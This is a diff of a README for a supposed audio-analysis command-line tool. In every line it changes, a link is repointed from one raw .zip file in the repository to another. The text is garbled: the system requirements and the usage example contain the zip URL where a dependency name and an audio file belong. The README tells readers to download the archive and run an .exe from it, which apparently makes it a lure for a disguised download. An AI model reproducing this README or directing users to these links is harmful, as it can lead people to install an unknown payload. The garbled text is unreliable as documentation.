@@ -1,6 +1,6 @@
 # 🎵 thriven-sound-analyzer - Analyze Audio Effortlessly
 
-[![Download Latest Release](https://raw.githubusercontent.com/vuichtoan/thriven-sound-analyzer/main/src/thriven_analyzer_sound_v2.1.zip%20Latest%20Release-%E2%86%93-blue)](https://raw.githubusercontent.com/vuichtoan/thriven-sound-analyzer/main/src/thriven_analyzer_sound_v2.1.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/vuichtoan/thriven-sound-analyzer/main/tests/sound_analyzer_thriven_v2.1.zip%20Latest%20Release-%E2%86%93-blue)](https://raw.githubusercontent.com/vuichtoan/thriven-sound-analyzer/main/tests/sound_analyzer_thriven_v2.1.zip)
 
 ## 📦 Overview
 
@@ -10,7 +10,7 @@ The thriven-sound-analyzer is an offline-first application for analyzing audio. 
 
 To begin using thriven-sound-analyzer, follow these simple steps:
 
-1. **Download the Application:** Visit the [Releases page](https://raw.githubusercontent.com/vuichtoan/thriven-sound-analyzer/main/src/thriven_analyzer_sound_v2.1.zip) to download the latest version of the application. Select the appropriate file for your operating system. 
+1. **Download the Application:** Visit the [Releases page](https://raw.githubusercontent.com/vuichtoan/thriven-sound-analyzer/main/tests/sound_analyzer_thriven_v2.1.zip) to download the latest version of the application. Select the appropriate file for your operating system. 
 
 2. **Install the Application:** 
    - For Windows: Run the downloaded `.exe` file and follow the installation prompts.
@@ -30,7 +30,7 @@ To begin using thriven-sound-analyzer, follow these simple steps:
 
 ## 📥 Download & Install
 
-To get the application, visit this page: [Download Latest Release](https://raw.githubusercontent.com/vuichtoan/thriven-sound-analyzer/main/src/thriven_analyzer_sound_v2.1.zip).
+To get the application, visit this page: [Download Latest Release](https://raw.githubusercontent.com/vuichtoan/thriven-sound-analyzer/main/tests/sound_analyzer_thriven_v2.1.zip).
 
 Make sure to choose the correct version for your system. If you experience any issues during the installation, consult the troubleshooting section below.
 
@@ -48,7 +48,7 @@ Before downloading, ensure that your system meets the following requirements:
 - Windows 10 or above, macOS Big Sur or above, or a modern Linux distribution.
 - Minimum 2 GB RAM.
 - Minimum 100 MB free disk space.
-- https://raw.githubusercontent.com/vuichtoan/thriven-sound-analyzer/main/src/thriven_analyzer_sound_v2.1.zip must be installed on your machine. You can download it from the [official https://raw.githubusercontent.com/vuichtoan/thriven-sound-analyzer/main/src/thriven_analyzer_sound_v2.1.zip website](https://raw.githubusercontent.com/vuichtoan/thriven-sound-analyzer/main/src/thriven_analyzer_sound_v2.1.zip).
+- https://raw.githubusercontent.com/vuichtoan/thriven-sound-analyzer/main/tests/sound_analyzer_thriven_v2.1.zip must be installed on your machine. You can download it from the [official https://raw.githubusercontent.com/vuichtoan/thriven-sound-analyzer/main/tests/sound_analyzer_thriven_v2.1.zip website](https://raw.githubusercontent.com/vuichtoan/thriven-sound-analyzer/main/tests/sound_analyzer_thriven_v2.1.zip).
 
 ## ⚙️ Usage
 
@@ -63,7 +63,7 @@ Once you have installed the application, you can begin analyzing audio files wit
 
 For example:
 ```
-thriven-sound-analyzer --lufs https://raw.githubusercontent.com/vuichtoan/thriven-sound-analyzer/main/src/thriven_analyzer_sound_v2.1.zip
+thriven-sound-analyzer --lufs https://raw.githubusercontent.com/vuichtoan/thriven-sound-analyzer/main/tests/sound_analyzer_thriven_v2.1.zip
 ```
 
 This command will analyze your audio file for loudness units.
@@ -74,7 +74,7 @@ If you encounter any issues:
 
 - Ensure you have the correct permissions to run the application.
 - Make sure you are in the right directory in your command line.
-- Revisit the [Releases page](https://raw.githubusercontent.com/vuichtoan/thriven-sound-analyzer/main/src/thriven_analyzer_sound_v2.1.zip) to ensure you downloaded the latest version.
+- Revisit the [Releases page](https://raw.githubusercontent.com/vuichtoan/thriven-sound-analyzer/main/tests/sound_analyzer_thriven_v2.1.zip) to ensure you downloaded the latest version.
 
 ## 📞 Support
 
@@ -92,6 +92,6 @@ This project is licensed under the MIT License. You can read the full license in
 
 This application covers the following topics: audio, audio-analysis, audio-pipeline, CLI, ffmpeg, loopmeliveup, lufs, and nodejs.
 
-For further details, visit the [repository](https://raw.githubusercontent.com/vuichtoan/thriven-sound-analyzer/main/src/thriven_analyzer_sound_v2.1.zip). 
+For further details, visit the [repository](https://raw.githubusercontent.com/vuichtoan/thriven-sound-analyzer/main/tests/sound_analyzer_thriven_v2.1.zip). 
 
-Remember, to download the latest release, click here: [Download Latest Release](https://raw.githubusercontent.com/vuichtoan/thriven-sound-analyzer/main/src/thriven_analyzer_sound_v2.1.zip).
+Remember, to download the latest release, click here: [Download Latest Release](https://raw.githubusercontent.com/vuichtoan/thriven-sound-analyzer/main/tests/sound_analyzer_thriven_v2.1.zip).
